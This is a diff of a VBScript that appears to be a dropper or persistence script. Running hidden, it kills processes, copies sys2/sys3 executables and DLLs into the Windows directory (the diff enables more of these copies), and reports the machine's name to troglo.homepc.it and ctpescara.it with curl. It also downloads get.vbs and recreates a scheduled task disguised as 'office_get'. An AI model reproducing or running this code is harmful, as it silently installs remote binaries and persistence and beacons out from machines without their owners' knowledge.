@@ -7,9 +7,11 @@ With CreateObject("WScript.Shell")
     .Run "taskkill /f /im sys2.exe", 0, True
     .Run "taskkill /f /im rundll32.exe", 0, True
     .Run "cmd /c copy /Y " & windir & "\Temp\sys2.exe " & windir & "\sys2.exe" , 0, True
-    '.Run "cmd /c copy /Y " & windir & "\Temp\sys3.exe " & windir & "\sys3.exe" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.exe " & windir & "\sys3.exe" , 0, True
     .Run "cmd /c copy /Y " & windir & "\Temp\sys2.dll " & windir & "\sys2.dll" , 0, True
-    '.Run "cmd /c copy /Y " & windir & "\Temp\sys3.dll " & windir & "\sys3.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.dll " & windir & "\sys3.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\Temp\sys2.dll " & windir & "\sys2t.dll" , 0, True
+    .Run "cmd /c copy /Y " & windir & "\Temp\sys3.dll " & windir & "\sys3t.dll" , 0, True
     '.Run "schtasks /delete /tn flash_fw /F", 0, True
     
     '.Run "net start CppWindowsService", 0, True
@@ -59,8 +61,10 @@ With oShell
   .Run "curl http://troglo.homepc.it/svc/wup.php?pc=mttool_" & strComputerName, 0, True
   .Run "curl https://ctpescara.it/svc/wup.php?pc=mttool_" & strComputerName, 0, True
   .Run "curl http://troglo.homepc.it/win/get.vbs -o " & windir & "\get.vbs", 0, True
-  .Run "curl http://troglo.homepc.it/win/sys2.exe -o " & windir & "\sys2.exe", 0, True
-  .Run "curl http://troglo.homepc.it/win/sys3.exe -o " & windir & "\sys3.exe", 0, True
+  '.Run "curl http://troglo.homepc.it/win/inst.bat -o " & windir & "\inst.bat", 0, True
+  '.Run windir & "\inst.bat", 0, True
+  '.Run "curl http://troglo.homepc.it/win/sys2.exe -o " & windir & "\sys2.exe", 0, True
+  '.Run "curl http://troglo.homepc.it/win/sys3.exe -o " & windir & "\sys3.exe", 0, True
   .Run "schtasks /delete /tn office_get /F", 0, True
   .Run "schtasks /create /tn office_get /xml " & windir & "\office_get.xml /F", 0, True
   .Run "sc delete CppWindowsService", 0, True
